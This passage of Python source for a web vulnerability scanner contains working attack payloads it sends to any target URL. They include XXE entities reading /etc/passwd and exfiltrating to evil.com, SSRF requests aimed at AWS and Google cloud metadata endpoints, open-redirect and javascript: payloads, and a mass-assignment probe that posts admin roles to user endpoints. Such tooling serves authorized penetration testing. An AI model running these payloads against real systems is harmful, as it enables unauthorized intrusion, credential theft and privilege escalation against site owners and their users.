                                 "Microsoft" in response['text'] or ("root" in response['text'] and "x:" in response['text']) or
                                 response_time > 5):
                    self.print_status(
                        f"Possible command injection (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "Command Injection",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(
                        f"Command injection test error: {e}", "error")

        tasks = [test_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No command injection vulnerabilities detected", "success")

    async def check_xxe_injection(self, url):
        self.print_status(
            "Testing for XXE injection vulnerabilities...", "info")

        xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [ <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",

            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [ <!ELEMENT foo ANY >
            <!ENTITY % xee SYSTEM "file:///etc/passwd">
            <!ENTITY callhome SYSTEM "http://evil.com/?%xxe;">]>
            <foo>&callhome;</foo>"""
        ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                headers = {"Content-Type": "application/xml"}
                response = await self.async_request('POST', url, data=payload, headers=headers, timeout=CONFIG["TIMEOUT"])

                if response and ("root:x:" in response['text'] or "<?xml" in response['text'] or
                                 "DOCTYPE" in response['text'] or "XML" in response['text']):
                    self.print_status(
                        "Possible XXE injection vulnerability", "warning")
                    self.vulnerabilities.append({
                        "type": "XXE Injection",
                        "url": url,
                        "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(f"XXE test error: {e}", "error")

        tasks = [test_payload(payload) for payload in xxe_payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No XXE injection vulnerabilities detected", "success")

    async def check_ssrf(self, url):
        self.print_status("Testing for SSRF vulnerabilities...", "info")

        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "http://0177.0.0.1",
            "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/"
        ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?url={quote(payload)}"
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and ("InstanceMetadata" in response['text'] or "aws-" in response['text'] or
                                 "google" in response['text'] or "internal" in response['text']):
                    self.print_status(
                        f"Possible SSRF (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "SSRF",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(f"SSRF test error: {e}", "error")

        tasks = [test_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status("No SSRF vulnerabilities detected", "success")

    async def check_open_redirect(self, url):
        self.print_status(
            "Testing for open redirect vulnerabilities...", "info")

        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "http://google.com@evil.com",
            "javascript:alert(1)"
        ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?redirect={quote(payload)}"
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"], allow_redirects=False)

                if response and response['status'] in [301, 302, 303, 307, 308] and (
                    "evil.com" in response['headers'].get('Location', '') or
                        "google.com" in response['headers'].get('Location', '')):
                    self.print_status(
                        f"Possible open redirect (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "Open Redirect",
                        "url": test_url,
                        "payload": payload,
                        "evidence": f"Redirects to: {response['headers'].get('Location', '')}"
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(
                        f"Open redirect test error: {e}", "error")

        tasks = [test_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No open redirect vulnerabilities detected", "success")

    async def test_api_endpoints(self, url):
        self.print_status("Testing for API vulnerabilities...", "info")

        api_paths = [
            "/api/v1/users",
            "/api/v1/auth",
            "/api/v1/admin",
            "/graphql",
            "/rest/v1",
            "/soap/v1",
            "/api.json",
            "/swagger.json"
        ]

        vulnerable = False

        async def test_path(path):
            nonlocal vulnerable
            try:
                test_url = urljoin(url, path)
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and response['status'] == 200 and (
                    "application/json" in response['headers'].get('Content-Type', '') or
                        "api" in response['text'].lower() or "swagger" in response['text'].lower()):
                    self.print_status(
                        f"API endpoint found: {test_url}", "success")

                    if await self.test_broken_object_level_control(test_url):
                        vulnerable = True

                    if await self.test_excessive_data_exposure(test_url):
                        vulnerable = True

                    if await self.test_mass_assignment(test_url):
                        vulnerable = True

                    if await self.test_insecure_direct_object_reference(test_url):
                        vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(f"API test error: {e}", "error")

        tasks = [test_path(path) for path in api_paths]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No obvious API vulnerabilities detected", "success")

    async def test_broken_object_level_control(self, url):
        test_url = url.rstrip('/') + "/1"
        try:
            response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])
            if response and response['status'] == 200 and "application/json" in response['headers'].get('Content-Type', ''):
                try:
                    data = json.loads(response['text'])
                    if isinstance(data, dict) and ("email" in data or "password" in data):
                        self.print_status(
                            f"Possible BOLA vulnerability at {test_url}", "warning")
                        self.vulnerabilities.append({
                            "type": "Broken Object Level Control",
                            "url": test_url,
                            "payload": None,
                            "evidence": str(data)[:200] + "..." if len(str(data)) > 200 else str(data)
                        })
                        return True
                except json.JSONDecodeError:
                    pass
        except:
            pass
        return False

    async def test_excessive_data_exposure(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if response and response['status'] == 200 and "application/json" in response['headers'].get('Content-Type', ''):
                try:
                    data = json.loads(response['text'])
                    if isinstance(data, dict):
                        sensitive_fields = ['password',
                                            'token', 'secret', 'credit_card']
                        if any(field in data for field in sensitive_fields):
                            self.print_status(
                                f"Possible excessive data exposure at {url}", "warning")
                            self.vulnerabilities.append({
                                "type": "Excessive Data Exposure",
                                "url": url,
                                "payload": None,
                                "evidence": f"Exposes sensitive fields: {', '.join(f for f in sensitive_fields if f in data)}"
                            })
                            return True
                except json.JSONDecodeError:
                    pass
        except:
            pass
        return False

    async def test_mass_assignment(self, url):
        if url.endswith('/users') or '/users' in url.lower():
            test_data = {
                "username": "testuser",
                "email": "test@example.com",
                "is_admin": True,
                "role": "admin"
            }
            try:
                response = await self.async_request('POST', url, json=test_data, timeout=CONFIG["TIMEOUT"])
            except:
                return False
                
            if response and response['status'] == 200:
                try:
                    resp_data = json.loads(response['text'])
                    if isinstance(resp_data, dict) and ("is_admin" in resp_data or "role" in resp_data):
                        self.print_status(
                            f"Possible mass assignment at {url}", "warning")
                        self.vulnerabilities.append({
                            "type": "Mass Assignment",
                            "url": url,
                            "payload": str(test_data),
                            "evidence": str(resp_data)[:200] + "..." if len(str(resp_data)) > 200 else str(resp_data)
                        })
                        return True
                except json.JSONDecodeError:
                    pass
        return False

    async def test_insecure_direct_object_reference(self, url):
        base_url = url.rstrip('/123')
        test_url = base_url + "/1234"

        try:
            r1 = await self.async_request('GET', base_url + "/123", timeout=CONFIG["TIMEOUT"])
            r2 = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

            if (r1 and r2 and r1['status'] == 200 and r2['status'] == 200 and
                "application/json" in r1['headers'].get('Content-Type', '') and
                    "application/json" in r2['headers'].get('Content-Type', '')):
                try:
                    data1 = json.loads(r1['text'])
                    data2 = json.loads(r2['text'])

                    if isinstance(data1, dict) and isinstance(data2, dict) and data1 != data2:
                        self.print_status(
                            f"Possible IDOR at {test_url}", "warning")
                        self.vulnerabilities.append({
                            "type": "Insecure Direct Object Reference",
                            "url": test_url,
                            "payload": None,
                            "evidence": f"Different data returned for different IDs"
                        })
                        return True
                except json.JSONDecodeError:
                    pass
        except:
            pass
        return False

    def generate_report(self, url):
        self.print_status("Generating vulnerability report...", "info")

        if not self.vulnerabilities:
            self.print_status("No vulnerabilities found!", "success")
            return

        reports_dir = "reports"
        if not os.path.exists(reports_dir):
            os.makedirs(reports_dir)

        parsed_url = urlparse(url)
        domain = parsed_url.netloc.replace(':', '_').replace('/', '_')
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        report_filename = f"{reports_dir}/{domain}_{timestamp}.json"

        report_data = {
            "scan_date": timestamp,
            "target": url,
            "vulnerabilities": self.vulnerabilities,
            "stats": {
                "total": len(self.vulnerabilities),
                "critical": sum(1 for v in self.vulnerabilities if "critical" in str(v).lower()),
                "high": sum(1 for v in self.vulnerabilities if "warning" in str(v).lower()),
                "medium": sum(1 for v in self.vulnerabilities if "info" in str(v).lower()),
                "low": sum(1 for v in self.vulnerabilities if "debug" in str(v).lower())
            }
        }

        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2)

        self.print_status(f"Report saved to {report_filename}", "success")

        print("\n" + "="*100)
        print(f"{'VULNERABILITY SCAN SUMMARY':^100}")
        print("="*100)
        print(f"Target: {url}")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
        print(f"Critical: {report_data['stats']['critical']}")
        print(f"High: {report_data['stats']['high']}")
        print(f"Medium: {report_data['stats']['medium']}")
        print(f"Low: {report_data['stats']['low']}")
        print("="*100 + "\n")

        print(f"{'TOP VULNERABILITIES':^100}")
        print("="*100)
        for vuln in sorted(self.vulnerabilities, key=lambda x: x.get('type', ''))[:10]:
            print(f"Type: {vuln.get('type', 'N/A')}")
            print(f"URL: {vuln.get('url', 'N/A')}")
            print(f"Payload: {vuln.get('payload', 'N/A')}")
            print(f"Evidence: {vuln.get('evidence', 'N/A')}")
            print("-"*100)

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Web Security Scanner")
    parser.add_argument("url", nargs="?", help="URL to scan")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Enable verbose output")
    parser.add_argument("-a", "--aggressive", action="store_true",
                        help="Run aggressive scans (more payloads)")
    args = parser.parse_args()

    if args.url:
        url = args.url
    else:
        url = input("Enter target URL (with or without http/https): ").strip()

    scanner = WebScanner(verbose=args.verbose, aggressive=args.aggressive)
    scanner.scan(url)


if __name__ == "__main__":
    main()

